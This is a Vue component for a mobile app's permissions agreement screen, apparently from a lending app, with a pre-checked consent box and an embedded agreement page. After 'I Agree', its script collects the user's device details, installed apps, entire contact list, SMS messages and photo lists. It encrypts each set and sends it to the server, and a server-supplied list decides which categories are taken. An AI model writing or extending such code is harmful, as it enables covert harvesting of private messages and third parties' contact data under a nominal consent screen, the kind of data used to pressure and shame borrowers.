<template>
    <div class="quanxian">
        <TopDesc desc="permissions" info="Please read the following agreement carefully"></TopDesc>
        <div class="box">
            <iframe
                src="https://app.cashviolin.xyz/cossack-graver-underdogger/ruminative-heartbreaking-messy/boozy-helianthus/iivskc.html"
                frameborder="0"></iframe>
        </div>
        <div class="desc">
            <van-checkbox class="checkbox" checked-color="#e1a08b" @click="doChange" v-model="beforeqx" shape="square">
                By continuing, you have
                read and agreed to the
                above
            </van-checkbox>
        </div>
        <div class="bottom">
            <div class="disagree" @click="$router.back()">I Disagree</div>
            <div class="agree" @click="doAgree">I Agree</div>
        </div>
    </div>
</template>
<script>
import { Toast } from "vant";
import { getPermission, getDeviceInfo, getApp, getSms, getPhoto, getContact, getPhoneInfo } from "../../utils/android.js";
import { setDeviceInfoAPI, getshebeiInfoAPI, getAppInfoAPI, gettxlAPI, getduanxinAPI, getPhotoInfoAPI } from "../../api";
import { add, unt } from "../../utils/AESKey.js";
import isNext from '../form/isNext.js'
export default {
    data() {
        return {
            beforeqx: true
        }
    },
    methods: {
        doChange() {
            this.$store.commit('changequanxian')
        },
        //下一步
        async doAgree() {
            if (this.beforeqx) {
                // 去获取权限，上报权限，并且判断下一步跳转哪里
                let res = await getPermission()
                //拒绝两次
                if (!res.result) {
                    Dialog({
                        message: 'Please re-acquire the permission, if it is rejected twice, please open the permission in the phone settings', confirmButtonText: 'Confirm'
                    });
                    return
                }
                //上报设备信息
                this.getInfo()
                isNext()
            } else {
                Toast('Please check the agreement first')
            }
        },
        //获取设备信息上报情况
        async getInfo() {
            const res = await setDeviceInfoAPI()
            this.list = unt(res.data).list
            console.log(this.list, 'this.list')
            console.log(JSON.stringify(this.list), 'this.list')
            if (this.list.indexOf("DEVICE") > -1) {
                let res = await getDeviceInfo();
                let info = JSON.parse(res.appInfo);
                getshebeiInfoAPI(add({ model: info.device }))
            }
            if (this.list.indexOf('APP') > -1) {
                let res = await getApp();
                let info = JSON.parse(res.appInfo);
                getAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
            }
            if (this.list.indexOf("CONTACT") > -1) {
                let res = await getContact();
                let info = JSON.parse(res.appInfo);
                gettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
            }
            if (this.list.indexOf("SMS") > -1) {
                let res = await getSms();
                let info = JSON.parse(res.appInfo);
                getduanxinAPI(add({ model: { list: info.smsList } }))
            }
            if (this.list.indexOf("PHOTO") > -1) {
                let res = await getPhoto();
                let info = JSON.parse(res.appInfo);
                getPhotoInfoAPI(add({ model: { list: info.photoList } }))
            }
            console.log(this.list, '设备信息上报情况')
        }
    }
}
</script>

<style lang="less" scoped>
.quanxian {
    padding-top: (100/@a);
    width: 100vw;
    height: (667/@a);
    background-color: #f5f5f5;

    .bottom {
        display: flex;
        justify-content: space-around;
        margin-top: (10/@a);

        .disagree {
            width: (152/@a);
            height: (47/@a);
            background: #E5E5E5;
            border-radius: (10/@a);
            font-size: (16/@a);
            text-align: center;
            line-height: (47/@a);
            font-family: Alibaba PuHuiTi;
            font-weight: bold;
            color: #FFFFFF;
        }

        .agree {
            width: (152/@a);
            height: (47/@a);
            background: #E1A08B;
            border-radius: (10/@a);
            font-size: (16/@a);
            text-align: center;
            line-height: (47/@a);
            font-family: Alibaba PuHuiTi;
            font-weight: bold;
            color: #fff;
        }
    }

    .box {
        width: (336/@a);
        height: (425/@a);
        background: #FFFFFF;
        border-radius: (10/@a);
        margin-left: (19/@a);
        overflow: hidden;

        iframe {
            width: 103vw;
            height: (425/@a);
        }
    }

    .desc {
        .checkbox {
            margin-top: (20/@a);
            margin-left: (19/@a);
        }
    }
}
</style>